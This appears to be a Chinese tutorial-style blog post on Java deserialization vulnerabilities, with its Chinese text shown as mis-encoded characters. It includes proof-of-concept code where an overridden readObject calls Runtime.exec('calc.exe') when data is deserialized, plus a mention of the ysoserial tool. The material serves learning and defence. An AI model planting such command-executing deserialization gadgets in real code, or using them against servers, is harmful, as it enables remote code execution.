åªè¦æœåŠ¡ç«¯ååºåˆ—åŒ–æ•°æ®ï¼Œå®¢æˆ·ç«¯ä¼ é€’ç±»çš„readObjectä¸­ä»£ç ä¼šè‡ªåŠ¨æ‰§è¡Œï¼Œç»™äºˆæ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œä»£ç çš„èƒ½åŠ›ã€‚ 3.1 å¯èƒ½çš„å½¢å¼ å…¥å£ç±»çš„readObjectç›´æ¥è°ƒç”¨å±é™©æ–¹æ³• å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»æœ‰å±é™©æ–¹æ³•ï¼ŒreadObjectæ—¶è°ƒç”¨ å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»åˆè°ƒç”¨å…¶ä»–æœ‰å±é™©æ–¹æ³•çš„ç±»ï¼ŒreadObjectæ—¶è°ƒç”¨ æ¯”å¦‚ç±»å‹å®šä¹‰ä¸ºObjectï¼Œè°ƒç”¨equals/hashcode/toString ç›¸åŒç±»å‹ åŒåå‡½æ•° æ„é€ å‡½æ•°/é™æ€ä»£ç å—ç­‰ç±»åŠ è½½æ—¶éšå¼æ‰§è¡Œ 3.2 JAVAåŸç”Ÿååºåˆ—åŒ–æ¼æ´æˆå›  Javaä¸­é—´ä»¶é€šå¸¸é€šè¿‡ç½‘ç»œæ¥æ”¶å®¢æˆ·ç«¯å‘é€çš„åºåˆ—åŒ–æ•°æ®ï¼Œè€Œåœ¨æœåŠ¡ç«¯å¯¹åºåˆ—åŒ–æ•°æ®è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œä¼šè°ƒç”¨è¢«åºåˆ—åŒ–å¯¹è±¡çš„readObject()æ–¹æ³•ã€‚ è€Œåœ¨Javaä¸­å¦‚æœé‡å†™äº†æŸä¸ªç±»çš„æ–¹æ³•ï¼Œå°±ä¼šä¼˜å…ˆè°ƒç”¨ç»è¿‡ä¿®æ”¹åçš„æ–¹æ³•ã€‚ å¦‚æœæŸä¸ªå¯¹è±¡é‡å†™äº†readObject()æ–¹æ³•ï¼Œä¸”åœ¨æ–¹æ³•ä¸­èƒ½å¤Ÿæ‰§è¡Œä»»æ„ä»£ç ï¼Œé‚£æœåŠ¡ç«¯åœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œä¹Ÿä¼šæ‰§è¡Œç›¸åº”ä»£ç  ç®€å•æ¥è¯´ï¼šæ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„è¾“å…¥ï¼Œè®©ååºåˆ—åŒ–äº§ç”Ÿéé¢„æœŸçš„å¯¹è±¡ï¼Œåœ¨æ­¤è¿‡ç¨‹ä¸­æ‰§è¡Œæ„é€ çš„æ¶æ„ä»£ç ã€‚ 0x04 Javaååºåˆ—åŒ–åŸºç¡€ ä¸åŒäºPHPåºåˆ—åŒ–æ˜¯å°†å¯¹è±¡è½¬æ¢æˆäº†å­—ç¬¦ä¸²ï¼ŒJavaåºåˆ—åŒ–æ˜¯å°†å¯¹è±¡è½¬æ¢ä¸ºäº†å­—èŠ‚æµï¼Œä¸”åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ˜¯ä¸€ç§æ€æƒ³ï¼Œå¹¶ä¸å±€é™äºå…¶å®ç°å½¢å¼ã€‚å¦‚ï¼š JAVAå†…ç½®çš„writeObject()/readObject() JAVAå†…ç½®çš„XMLDecoder()/XMLEncoder XStream SnakeYaml FastJson Jackson å‡ºç°è¿‡æ¼æ´çš„ç»„ä»¶ï¼š Apache Shiro Apache Axis Weblogic Jboss Fastjson çœ‹ä¸€ä¸‹Javaä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ–¹æ³•ï¼š public class Main { public static void main(String[] args) throws Exception{ Runtime.getRuntime().exec(\"calc.exe\"); } } Javaä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ä½¿ç”¨java.lang.Runtimeç±»çš„execæ–¹æ³•ï¼š ä»¥ä¸Šå‡½æ•°å¯ä»¥å¼¹å‡ºè®¡ç®—å™¨ getRuntime()æ˜¯Runtimeç±»ä¸­çš„é™æ€æ–¹æ³•,ä½¿ç”¨æ­¤æ–¹æ³•è·å–å½“å‰javaç¨‹åºçš„Runtime(å³è¿è¡Œæ—¶:è®¡ç®—æœºç¨‹åºè¿è¡Œéœ€è¦çš„ä»£ç åº“,æ¡†æ¶,å¹³å°ç­‰) execåº•å±‚ä¸ºProcessBuilder:æ­¤ç±»ç”¨äºåˆ›å»ºæ“ä½œç³»ç»Ÿè¿›ç¨‹ï¼Œæ¯ä¸ªProcessBuilderå®ä¾‹ç®¡ç†è¿›ç¨‹å±æ€§çš„é›†åˆã€‚ start()æ–¹æ³•ä½¿ç”¨è¿™äº›å±æ€§åˆ›å»ºä¸€ä¸ªæ–°çš„Processå®ä¾‹ã€‚ start()æ–¹æ³•å¯ä»¥ä»åŒä¸€å®ä¾‹é‡å¤è°ƒç”¨ï¼Œä»¥åˆ›å»ºå…·æœ‰ç›¸åŒæˆ–ç›¸å…³å±æ€§çš„æ–°å­è¿›ç¨‹ã€‚ æ³¨æ„:è¿™é‡Œçš„å‘½ä»¤æ‰§è¡Œ,å¹¶ä¸æ˜¯ä½¿ç”¨ç³»ç»Ÿä¸­çš„bashæˆ–æ˜¯cmdè¿›è¡Œçš„ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œï¼Œè€Œæ˜¯ä½¿ç”¨JAVAæœ¬èº«ï¼Œæ‰€ä»¥åå¼¹shellçš„é‡å®šå‘ç¬¦åœ¨JAVAä¸­å¹¶ä¸æ”¯æŒ æˆ‘ä»¬æ¥ç»†åˆ†ä¸€ä¸‹ä¸Šè¿°æ‰§è¡Œå‘½ä»¤çš„æ­¥éª¤ï¼š public class Main { public static void main(String[] args) throws Exception{ Runtime runtime = Runtime.getruntime(); runtime.exec(\"calc.exe\"); } } é‚£ä¹ˆç›¸åº”çš„åå°„çš„ä»£ç å¦‚ä¸‹ import java.lang.reflect.Method; public class ExecTest { public static void main(String[] args) throws Exception{ Object runtime = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\", new Class[]{}).invoke(null); //System.out.println(runtime.getClass().getName()); Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(runtime,\"calc.exe\"); } } getMethod(æ–¹æ³•å, æ–¹æ³•ç±»å‹) invoke(æŸä¸ªå¯¹è±¡å®ä¾‹ï¼Œ ä¼ å…¥å‚æ•°) è¿™é‡Œç¬¬ä¸€å¥Object runtime = Class.forName(\"java.lang.Runtime\")çš„ä½œç”¨ç­‰ä»·äº Object runtime = Runtime.getRuntime() ç›®çš„æ˜¯è·å–ä¸€ä¸ªå¯¹è±¡å®ä¾‹å¥½è¢«ä¸‹ä¸€ä¸ªinvokeè°ƒç”¨ ç¬¬äºŒå¥Class.forName(\"java.lang.Runtime\").xxxxçš„ä½œç”¨å°±æ˜¯è°ƒç”¨ä¸Šä¸€æ­¥ç”Ÿæˆçš„runtimeå®ä¾‹çš„execæ–¹æ³•ï¼Œå¹¶å°†\"calc.exe\"å‚æ•°ä¼ å…¥exec()æ–¹æ³• æ¥ä¸‹æ¥ç¼–å†™Javaååºåˆ—åŒ–è¿‡ç¨‹ï¼š åœ¨Javaå½“ä¸­ï¼Œå¦‚æœä¸€ä¸ªç±»éœ€è¦è¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ– ï¼Œéœ€è¦å®ç°java.io.Serializableæ¥å£ ObjectOutputStreamç±»çš„writeObject(Object obj)æ–¹æ³•ï¼Œå°†å¯¹è±¡åºåˆ—åŒ–æˆå­—ç¬¦ä¸²æ•°æ® ObjectInputStreamç±»çš„readObject(Object obj)æ–¹æ³•ï¼Œå°†å­—ç¬¦ä¸²æ•°æ®ååºåˆ—åŒ–æˆå¯¹è±¡ import java.io.*; public class Serialize { public static void main(String[] args) throws Exception{ //è¦åºåˆ—åŒ–çš„æ•°æ® String name = \"hybcx\"; //åºåˆ—åŒ– FileOutputStream fileOutputStream = new FileOutputStream(\"serialize1.txt\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(name); objectOutputStream.close(); //ååºåˆ—åŒ– FileInputStream fileInputStream = new FileInputStream(\"serialize1.txt\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); Object result = objectInputStream.readObject(); objectInputStream.close(); System.out.println(result); } } æˆ‘ä»¬ç”¨010ç¼–è¾‘å™¨æ‰“å¼€ä¸Šè¿°ç”Ÿæˆçš„æ–‡ä»¶çœ‹çœ‹ å¯è§ä¸Šè¿°åå…­è¿›åˆ¶æ˜¯ä»¥acedå¼€å¤´çš„ï¼Œè¿™é‡Œè¯´ä¸€ä¸‹Javaåºåˆ—åŒ–ç‰¹æ€§ï¼š ä¸€æ®µæ•°æ®ä»¥ rO0AB å¼€å¤´ï¼Œä½ åŸºæœ¬å¯ä»¥ç¡®å®šè¿™ä¸²å°±æ˜¯ JAVA åºåˆ—åŒ– base64 åŠ å¯†çš„æ•°æ®ã€‚ æˆ–è€…å¦‚æœä»¥ aced å¼€å¤´ï¼Œé‚£ä¹ˆä»–å°±æ˜¯è¿™ä¸€æ®µ java åºåˆ—åŒ–çš„ 16 è¿›åˆ¶ã€‚ ä¸”0005 ä¸º Java å¯¹è±¡åºåˆ—åŒ–çš„ç‰ˆæœ¬å· import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Serialize2 { public static void main(String[] args) throws Exception{ //è¦åºåˆ—åŒ–çš„æ•°æ® Object runtime = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\", new Class[]{}).invoke(null); Object evil = Class.forName(\"java.lang.Runtime\").getMethod(\"exec\", String.class).invoke(runtime, \"calc.exe\"); //Object evil = Runtime.getRuntime().exec(\"calc.exe\"); //åºåˆ—åŒ– FileOutputStream fileOutputStream = new FileOutputStream(\"serialize2.txt\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(evil); objectOutputStream.close(); //ååºåˆ—åŒ– FileInputStream fileInputStream = new FileInputStream(\"serialize2.txt\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); Object result = objectInputStream.readObject(); objectInputStream.close(); System.out.println(result); } } è¿™é‡Œå¦‚æœæˆ‘ä»¬ç›´æ¥è¿è¡Œä¼šå‘ç°æŠ¥é”™ï¼Œä½†è®¡ç®—å™¨æ˜¯æˆåŠŸå¼¹å‡ºçš„ï¼Œè¿™æ˜¯å› ä¸ºä¸Šè¿°Runtimeç±»æ²¡æœ‰ç»§æ‰¿Serializableæ¥å£ï¼Œæ‰€ä»¥å¯¼è‡´ä¸ä¼šæˆåŠŸï¼Œå®ƒå¼¹æ˜¯åœ¨å†™Objectçš„æ—¶å€™å¼¹å‡ºæ¥çš„ æˆ‘ä»¬å¦‚æœè·Ÿè¿›java.io.Serializableæ¥å£ä¼šå‘ç°å¦‚ä¸‹å›¾ï¼Œæ˜¯ä¸€ä¸ªç©ºç±»ï¼Œæœ‰ä½å¸ˆå‚…è¿™æ ·è§£é‡Šï¼šè¿™è¯´æ˜èµ·ä½œç”¨åªæ˜¯ä¸ºäº†åœ¨ååºåˆ—åŒ–å’Œåºåˆ—åŒ–ä¸­ï¼Œåšä¸€ä¸ªç±»å‹åˆ¤æ–­ã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸ºéµå¾ªéå¿…è¦åŸåˆ™ï¼Œä¸éœ€è¦ååºåˆ—åŒ–çš„ç±»å°±å¯ä»¥ä¸ç”¨ååºåˆ—åŒ–äº†ã€‚ 4.1 å¦‚ä½•åºåˆ—åŒ–ç±» JavaåŸç”Ÿå®ç°äº†ä¸€å¥—åºåˆ—åŒ–çš„æœºåˆ¶ï¼Œå®ƒè®©æˆ‘ä»¬ä¸éœ€è¦é¢å¤–ç¼–å†™ä»£ç ï¼Œåªéœ€è¦å®ç°java.io.Serializableæ¥å£ï¼Œå¹¶è°ƒç”¨ObjectOutputStreamç±»çš„writeObjectæ–¹æ³•å³å¯ Personç±»å®ç°ï¼š package serializable; import java.io.IOException; import java.io.ObjectInputStream; import java.io.Serializable; /* * implements Serializable:åºåˆ—åŒ–çš„å‰æ,éœ€è¦å®ç°è¿™ä¸ªæ¥å£ * Serializable:è¡¨ç¤ºè¿™ä¸ªç±»çš„æˆå‘˜å¯ä»¥è¢«åºåˆ—åŒ– */ public class Person implements Serializable { private static final long serialVersionUID = 1L; // æ·»åŠ ä¸€ä¸ª transient å…³é”®å­—,åˆ™nameå±æ€§ä¸ä¼šè¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ– // å¦‚æœå°†å±æ€§è®¾ç½®ä¸ºstatic,åŒæ ·ä¸ä¼šè¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ– // private transient String name; public String name; private int age; public Person(){ } public Person(String name, int age) { this.name = name; this.age = age; } /* * @Overrideæ˜¯Java5çš„å…ƒæ•°æ®,è‡ªåŠ¨åŠ ä¸Šå»çš„ä¸€ä¸ªæ ‡å¿—,å‘Šè¯‰ä½ è¯´ä¸‹é¢è¿™ä¸ªæ–¹æ³•æ˜¯ä»çˆ¶ç±»/æ¥å£ * ç»§æ‰¿è¿‡æ¥çš„,éœ€è¦ä½ é‡å†™ä¸€æ¬¡,è¿™æ ·å°±å¯ä»¥æ–¹ä¾¿ä½ é˜…è¯»,ä¹Ÿä¸æ€•ä¼šå¿˜è®° * @Overrideæ˜¯ä¼ªä»£ç ,è¡¨ç¤ºé‡å†™(å½“ç„¶ä¸å†™ä¹Ÿå¯ä»¥),ä¸è¿‡å†™ä¸Šæœ‰å¦‚ä¸‹å¥½å¤„: * 1. å¯ä»¥å½“æ³¨é‡Šç”¨,æ–¹ä¾¿é˜…è¯» * 2. ç¼–è¯‘å™¨å¯ä»¥ç»™ä½ éªŒè¯@Overrideä¸‹é¢çš„æ–¹æ³•åæ˜¯å¦æ˜¯ä½ çˆ¶ç±»ä¸­æ‰€æœ‰çš„,å¦‚æœæ²¡æœ‰åˆ™æŠ¥é”™ * æ¯”å¦‚ä½ å¦‚æœæ²¡å†™@Overrideè€Œä½ ä¸‹é¢çš„æ–¹æ³•ååˆå†™é”™äº†,è¿™æ—¶ä½ çš„ç¼–è¯‘å™¨æ˜¯å¯ä»¥é€šè¿‡çš„(å®ƒä»¥ä¸ºè¿™ä¸ªæ–¹æ³•æ˜¯ä½ çš„å­ç±»ä¸­è‡ªå·±å¢åŠ çš„æ–¹æ³•) * ä½¿ç”¨è¯¥æ ‡è®°æ˜¯ä¸ºäº†å¢å¼ºç¨‹åºåœ¨ç¼–è¯‘æ—¶å€™çš„æ£€æŸ¥,å¦‚æœè¯¥æ–¹æ³•å¹¶ä¸æ˜¯ä¸€ä¸ªè¦†ç›–çˆ¶ç±»çš„æ–¹æ³•,åœ¨ç¼–è¯‘æ—¶ç¼–è¯‘å™¨å°±ä¼šæŠ¥å‘Šé”™è¯¯ */ @Override public String toString() { return \"Person{\" + \"name='\" + name + '\\'' + \",age=\" + age + '}'; } private void readObject(ObjectInputStream objectInputStream) throws IOException, ClassNotFoundException { /* * java.io.ObjectInputStream.defaultReadObject() * æ–¹æ³•ç”¨äºä»è¿™ä¸ªObjectInputStreamè¯»å–å½“å‰ç±»çš„éé™æ€å’Œéç¬æ€å­—æ®µ.å®ƒé—´æ¥åœ°æ¶‰åŠåˆ°è¯¥ç±»çš„readObject()æ–¹æ³•çš„å¸®åŠ©. * å¦‚æœå®ƒè¢«è°ƒç”¨,åˆ™ä¼šæŠ›å‡ºNotActiveException */ objectInputStream.defaultReadObject(); /* * æ¯ä¸ªJavaåº”ç”¨ç¨‹åºéƒ½æœ‰ä¸€ä¸ªRuntimeç±»çš„Runtime ,å…è®¸åº”ç”¨ç¨‹åºä¸è¿è¡Œåº”ç”¨ç¨‹åºçš„ç¯å¢ƒè¿›è¡Œæ¥å£.å½“å‰è¿è¡Œæ—¶å¯ä»¥ä»getRuntimeæ–¹æ³•è·å¾—. */ /* * exec:åœ¨å…·æœ‰æŒ‡å®šç¯å¢ƒçš„å•ç‹¬è¿›ç¨‹ä¸­æ‰§è¡ŒæŒ‡å®šçš„å­—ç¬¦ä¸²å‘½ä»¤ */ Runtime.getRuntime().exec(\"calc.exe\"); } } Serializableç±»å®ç°ï¼š package serializable; import java.io.FileOutputStream; import java.io.IOException; import java.io.ObjectOutputStream; public class Serializable { public static void serializable(Object person) throws IOException { /* * ObjectOutputStreamå°†Javaå¯¹è±¡çš„åŸå§‹æ•°æ®ç±»å‹å’Œå›¾å½¢å†™å…¥OutputStream.å¯ä»¥ä½¿ç”¨ObjectInputStreamè¯»å–ï¼ˆé‡æ„ï¼‰ * å¯¹è±¡.å¯ä»¥é€šè¿‡ä½¿ç”¨æµçš„æ–‡ä»¶æ¥å®ç°å¯¹è±¡çš„æŒä¹…å­˜å‚¨.å¦‚æœæµæ˜¯ç½‘ç»œå¥—æ¥å­—æµ,åˆ™å¯ä»¥åœ¨å¦ä¸€ä¸ªä¸»æœºä¸Šæˆ–å¦ä¸€ä¸ªè¿›ç¨‹ä¸­é‡æ„å¯¹è±¡. */ /* * æ–‡ä»¶è¾“å‡ºæµæ˜¯ç”¨äºå°†æ•°æ®å†™å…¥åˆ°è¾“å‡ºæµFileæˆ–ä¸€ä¸ªFileDescriptor * .æ–‡ä»¶æ˜¯å¦å¯ç”¨æˆ–å¯èƒ½è¢«åˆ›å»ºå–å†³äºåº•å±‚å¹³å°.ç‰¹åˆ«æ˜¯æŸäº›å¹³å°å…è®¸ä¸€æ¬¡åªèƒ½æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ¥å†™å…¥ä¸€ä¸ªFileOutputStream * ï¼ˆæˆ–å…¶ä»–æ–‡ä»¶å†™å…¥å¯¹è±¡ï¼‰.åœ¨è¿™ç§æƒ…å†µä¸‹,å¦‚æœæ‰€æ¶‰åŠçš„æ–‡ä»¶å·²ç»æ‰“å¼€,åˆ™æ­¤ç±»ä¸­çš„æ„é€ å‡½æ•°å°†å¤±è´¥. * FileOutputStreamç”¨äºå†™å…¥è¯¸å¦‚å›¾åƒæ•°æ®çš„åŸå§‹å­—èŠ‚æµ. å¯¹äºå†™å…¥å­—ç¬¦æµ,è¯·è€ƒè™‘ä½¿ç”¨FileWriter . */ // åºåˆ—åŒ–çš„ç±» ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(\"ser.ser\")); /* * æ–¹æ³•writeObjectç”¨äºå°†ä¸€ä¸ªå¯¹è±¡å†™å…¥æµä¸­. ä»»ä½•å¯¹è±¡,åŒ…æ‹¬å­—ç¬¦ä¸²å’Œæ•°ç»„,éƒ½æ˜¯ç”¨writeObjectç¼–å†™çš„. å¤šä¸ªå¯¹è±¡æˆ–åŸè¯­å¯ä»¥å†™å…¥æµ. * å¿…é¡»ä»å¯¹åº”çš„ObjectInputstreamè¯»å–å¯¹è±¡,å…¶ç±»å‹å’Œå†™å…¥æ¬¡åºç›¸åŒ. */ // éœ€è¦åºåˆ—åŒ–çš„å¯¹è±¡æ˜¯è°? obj.writeObject(person); obj.close(); } public static void main(String[] args) throws Exception{ Person person = new Person(\"hybcx\", 18); serializable(person); } } è·Ÿè¿›writeObjectå‡½æ•°ï¼Œé˜…è¯»å…¶æ³¨é‡Šå¯çŸ¥ï¼š åœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹å½“ä¸­ï¼Œæ˜¯é’ˆå¯¹å¯¹è±¡æœ¬èº«ï¼Œè€Œéé’ˆå¯¹ç±»çš„ï¼Œå› ä¸ºé™æ€å±æ€§æ˜¯ä¸å‚ä¸åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹çš„ã€‚å¦å¤–ï¼Œå¦‚æœå±æ€§æœ¬èº«å£°æ˜äº†transientå…³é”®å­—ï¼Œä¹Ÿä¼šè¢«å¿½ç•¥ã€‚ä½†æ˜¯å¦‚æœæŸå¯¹è±¡ç»§æ‰¿äº†Aç±»ï¼Œé‚£ä¹ˆAç±»å½“ä¸­çš„å¯¹è±¡çš„å¯¹è±¡å±æ€§ä¹Ÿæ˜¯ä¼šè¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„(å‰ææ˜¯Aç±»ä¹Ÿå®ç°äº†java.io.Serializableæ¥å£) 4.2 å¦‚ä½•ååºåˆ—åŒ–ç±» åºåˆ—åŒ–ä½¿ç”¨ObjectOutPutStreamç±»ï¼Œååºåˆ—åŒ–ä½¿ç”¨çš„åˆ™æ˜¯ObjectInputStreamç±»çš„readObjectæ–¹æ³•ã€‚æˆ‘ä»¬åœ¨ä¹‹å‰é‡å†™äº†readObjectæ–¹æ³•ï¼Œæ‰€ä»¥ä¼šæ‰§è¡Œå‘½ä»¤ Unserializableç±»å®ç°ï¼š package serializable; import java.io.FileInputStream; import java.io.IOException; import java.io.ObjectInputStream; public class Unserializable { public static Object unserialize(String Filename) throws IOException, ClassNotFoundException { /* * ObjectInputStreamååºåˆ—åŒ–å…ˆå‰ä½¿ç”¨ObjectOutputStreamç¼–å†™çš„åŸå§‹æ•°æ®å’Œå¯¹è±¡. * ObjectOutputStreamå’ŒObjectInputStreamå¯ä»¥åˆ†åˆ«ä¸ºä¸FileOutputStreamå’ŒFileInputStreamä¸€èµ·ä½¿ç”¨çš„å¯¹è±¡å›¾æä¾›æŒä¹…æ€§å­˜å‚¨çš„åº”ç”¨ç¨‹åº. * ObjectInputStreamç”¨äºæ¢å¤å…ˆå‰åºåˆ—åŒ–çš„å¯¹è±¡. å…¶ä»–ç”¨é€”åŒ…æ‹¬ä½¿ç”¨å¥—æ¥å­—æµåœ¨ä¸»æœºä¹‹é—´ä¼ é€’å¯¹è±¡,æˆ–è€…åœ¨è¿œç¨‹é€šä¿¡ç³»ç»Ÿä¸­è¿›è¡Œå°é€å’Œè§£ç»„å‚æ•°å’Œå‚æ•°. * ObjectInputStreamç¡®ä¿ä»æµä¸­åˆ›å»ºçš„å›¾ä¸­çš„æ‰€æœ‰å¯¹è±¡çš„ç±»å‹ä¸Javaè™šæ‹Ÿæœºä¸­å­˜åœ¨çš„ç±»åŒ¹é…. æ ¹æ®éœ€è¦ä½¿ç”¨æ ‡å‡†æœºåˆ¶åŠ è½½ç±». * åªèƒ½ä»æµä¸­è¯»å–æ”¯æŒjava.io.Serializableæˆ–java.io.Externalizableæ¥å£çš„å¯¹è±¡. */ // ååºåˆ—åŒ–çš„ç±» ObjectInputStream ins = new ObjectInputStream((new FileInputStream(Filename))); /* * æ–¹æ³•readObjectç”¨äºä»æµä¸­è¯»å–å¯¹è±¡. åº”ä½¿ç”¨Javaçš„å®‰å…¨é“¸é€ æ¥è·å¾—æ‰€éœ€çš„ç±»å‹. åœ¨Javaä¸­,å­—ç¬¦ä¸²å’Œæ•°ç»„æ˜¯å¯¹è±¡,åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­è¢«è§†ä¸ºå¯¹è±¡. * è¯»å–æ—¶,éœ€è¦å°†å…¶è½¬æ¢ä¸ºé¢„æœŸç±»å‹. */ // è¯»å‡ºæ¥å¹¶ååºåˆ—åŒ– Object obj = ins.readObject(); ins.close(); return obj; } public static void main(String[] args) throws Exception { Person person = (Person) unserialize(\"ser.ser\"); System.out.println(person); } } å…¶å®ååºåˆ—åŒ–çš„å®ç°å°±æ˜¯åºåˆ—åŒ–çš„é€†è¿‡ç¨‹,ä¼šæ ¹æ®åºåˆ—åŒ–è¯»å‡ºæ•°æ®çš„ç±»å‹,è¿›è¡Œç›¸åº”çš„å¤„ç† 4.3 serialVersionUID åºåˆ—åŒ–å’Œååºåˆ—åŒ–å¯ä»¥ç†è§£ä¸ºå‹ç¼©å’Œè§£å‹ç¼©ï¼Œä½†æ˜¯å‹ç¼©ä¹‹æ‰€ä»¥èƒ½è¢«è§£å‹ç¼©çš„å‰ææ˜¯å› ä¸ºä»–ä¿©çš„åè®®æ˜¯ä¸€æ ·çš„ã€‚å¦‚æœå‹ç¼©æ˜¯ä»¥å››ä¸ªå­—èŠ‚ä¸ºä¸€ä¸ªå•ä½ï¼Œè€Œè§£å‹ç¼©ä»¥å…«ä¸ªå­—èŠ‚ä¸ºä¸€ä¸ªå•ä½ï¼Œå°±ä¼šä¹±å¥— åŒæ ·åœ¨Javaä¸­ä¸åè®®ç›¸å¯¹çš„æ¦‚å¿µä¸ºï¼šserialVersionUID å½“serialVersionUIDä¸ä¸€è‡´æ—¶ï¼Œååºåˆ—åŒ–ä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸ æ¯”å¦‚è®¾ç½®ä¸º1Læ—¶åºåˆ—åŒ–ï¼Œä¿®æ”¹ä¸º2Læ—¶ååºåˆ—åŒ–ï¼Œåˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ å¦‚ä¸Šå›¾ï¼Œè¿™é‡Œæˆ‘ä»¬ä¿®æ”¹ä¸º2Lï¼Œå¦‚ä¸‹å›¾å‘ç”ŸæŠ¥é”™ï¼Œ æˆ‘ä»¬è·Ÿè¿›ä¸Šå›¾æŠ¥é”™ç¬¬äºŒè¡Œçš„596é‚£ä¸€è¡Œï¼Œå‘ç°ä¸‹å›¾æƒ…å†µï¼šä»£ç è¿›è¡Œäº†åˆ¤æ–­suid != osc.getSerialVersionUID()å¦‚æœä¸¤æ¬¡UIDä¸ç›¸åŒï¼Œåˆ™æŠ›å‡ºå¼‚å¸¸ serializable.Person; local class incompatible: stream classdesc serialVersionUID = 1, local class serialVersionUID = 2 0x08 Javaååºåˆ—åŒ–1å®è·µ å­¦äº†ä¸Šè¿°é‚£ä¹ˆå¤šå‰ç½®çŸ¥è¯†ï¼Œä½†æˆ‘å‘ç°é‚£äº›æ–‡ç« è¿˜æœ‰å¤§æŠŠæ²¡è®²å®Œã€‚ã€‚ã€‚ã€‚å¤ªå¤šäº†éœ€è¦æ…¢æ…¢å•ƒï¼Œè¿™é‡Œæˆ‘å°±å…ˆå¤ç°ä¸€ä¸‹çœ‹å°è¿ªè¯¾ç¨‹çš„ä¸€äº›ä¾‹å­å§ 8.1 åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿‡ç¨‹ é¦–å…ˆä»–è¿™é‡Œç»™äº†ä¸€ä¸ªç®€å•åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä»£ç  Mainç±»å®ç°ï¼š package SerialTest; import java.io.Serializable; public class Main { public static void main(String[] args) { // write your code here } } //å®šä¹‰Personç±»ï¼Œç”¨äºåç»­åºåˆ—åŒ–å®ä¾‹å¯¹è±¡ class Person implements Serializable { private String name; private int age; private String sex; transient private int stuId; private static int count = 100; public Person(String name, int age, String sex, int stuId) { this.name = name; this.age = age; this.sex = sex; this.stuId = stuId; } //ç»§æ‰¿Personç±» @Override public String toString() { return String.format( \"Person{name: %s, age: %d, sex: %s, stuId: %d, count: %d} \", name, age, sex, stuId, count ); } } SerializableTestç±»å®ç°ï¼š package SerialTest; import java.io.*; public class SerializableTest { public static void main(String[] args) throws Exception { serialPerson(); Person person = deserialPerson(); System.out.println(person); } /** * Personå¯¹è±¡åºåˆ—åŒ– * @throws IOException */ private static void serialPerson() throws IOException { Person person = new Person(\"xiaodi\", 28, \"ç”·\", 101); //å°†Javaå¯¹è±¡çš„åŸå§‹æ•°æ®å†™å…¥åˆ°outputstream,å¯ä½¿ç”¨ObjectInputStreamè¯»å–,æœ€åå°†æ•°æ®å†™å…¥åˆ°è¾“å‡ºæµFile ObjectOutputStream oos = new ObjectOutputStream( new FileOutputStream(new File(\"person.txt\")) ); //å°†personå®ä¾‹å¯¹è±¡è¿›è¡Œåºåˆ—åŒ– oos.writeObject(person); System.out.println(\"person å¯¹è±¡åºåˆ—åŒ–æˆåŠŸï¼\"); oos.close(); } /** * Personå¯¹è±¡ååºåˆ—åŒ– * @return * @throws Exception */ private static Person deserialPerson() throws Exception { //æ¢å¤å…ˆå‰åºåˆ—åŒ–çš„å¯¹è±¡ ObjectInputStream ois = new ObjectInputStream( new FileInputStream(new File(\"hacker.txt\")) ); //ååºåˆ—åŒ–æ•°æ®æµ,ä¹Ÿå°±æ˜¯å…ˆå‰å®åŠ›å¯¹è±¡çš„åºåˆ—åŒ–å­—èŠ‚æµ Person person = (Person)ois.readObject(); System.out.println(\"person å¯¹è±¡ååºåˆ—åŒ–æˆåŠŸï¼\"); //Runtime.getRuntime().exec(\"calc.exe\"); return person; } } æˆ‘ä»¬è¿è¡Œä¹‹åå¦‚ä¸‹å›¾ åŒæ ·çš„aced 0005å¼€å¤´ 8.2 ysoserialå·¥å…·ä½¿ç”¨ çœ‹äº†æœ‰å‡ ç¯‡æ–‡ç« åˆ©ç”¨è¯¥å·¥å…·çš„jaråŒ…è¿›è¡Œä¸€äº›å¸¸è§Javaååºåˆ—åŒ–1æ¼æ´çš„é“¾å­åˆ†æâ€¦ä½†å¯¹äºçœ‹Javaä»£ç æœ‰äº›è®¸å›°éš¾çš„æˆ‘ï¼Œè¿˜æ˜¯å…ˆå­¦ä¼šå¦‚ä½•åœ¨å®æˆ˜ä¸­ä½¿ç”¨å§ é¡¹ç›®åœ°å€ï¼šhttps://github.com/frohoff/ysoserial --å”‰ï¼Œè¦æ˜¯è¿™ä¸ªé¡¹ç›®æŒç»­æ›´æ–°å°±å¥½äº† è¿™é‡Œçš„ç»ƒä¹ 